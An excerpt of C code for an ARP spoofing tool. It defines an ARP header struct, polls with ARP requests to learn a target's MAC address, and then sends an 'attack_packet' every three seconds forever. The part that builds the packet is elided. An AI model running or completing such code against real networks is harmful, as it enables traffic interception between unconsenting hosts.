...
// arp header
#pragma pack(push,1) // alloc memory to variables by 1 bytes (default is 4bytes)
struct ARP {
	uint16_t hdw_type;
	uint16_t pro_type;
	uint8_t  hdw_len;
...
int find_sender_mac(const u_char *packet, uint8_t *sender_mac, uint8_t *my_mac, uint32_t sender_ip, uint32_t my_ip) {
	ETHERNET *eth = (struct ETHERNET*) packet;
	if (ntohs(eth->type) == ETH_TYPE_ARP) {
		ARP *arp = (struct ARP*) &packet[ETH_HDR_LEN];
		
		if (htons(arp->opcode) == REPLY 			// if arp reply packet
			&& arp->target_ip == my_ip 				// if target ip is my ip
			&& arp->sender_ip == sender_ip			// if source ip is sender ip
			&& !memcmp(arp->target_mac, my_mac, 6)) {		// if target mac is my mac
...
int main(int argc, char *argv[]) {
	...
	while (true) {
		...
		if (count % 10 == 0) {
			pcap_sendpacket(handle, (uint8_t*)(&request_packet), packet_len);
		...
		if (find_sender_mac(packet, sender_mac, my_mac, sender_ip, my_ip))
			break;
	}
	...
	while (true) {
		pcap_sendpacket(handle, (uint8_t*)(&attack_packet), packet_len);
		sleep(3);
	}
}
